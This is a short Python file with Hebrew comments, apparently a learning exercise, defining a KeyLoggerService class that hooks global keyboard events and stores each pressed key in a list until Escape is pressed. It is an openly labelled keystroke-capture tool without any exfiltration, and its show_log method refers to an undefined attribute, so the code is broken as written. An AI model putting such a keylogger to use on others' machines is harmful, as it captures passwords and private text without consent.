import keyboard,datetime
# מחלקה שמאזינה להקלדות המקלדת בזמן אמת



class KeyLoggerService:
    # אתחול
    def __init__(self):
       self.keylog = ""
       self.data_list=[]

    def get_time(self):
        x = datetime.datetime.now()
        return  x.strftime("%Y-%m-%d %H:%M:%S")

# התחלת האזנה
    def start_listening(self):
        keyboard.hook(self.log_key_event)
        keyboard.wait("esc")

# סיום האזנה
    def stop_listening(self):
        keyboard.unhook_all()



    # האזנה למקלדת
    def log_key_event(self, event):
            if event.event_type == keyboard.KEY_DOWN:
                self.keylog = event.name
                self.data_list.append([self.keylog])

    def show_log(self):
        for time, log in self.data_dict.items():
            print(f"[{time}] {log}")







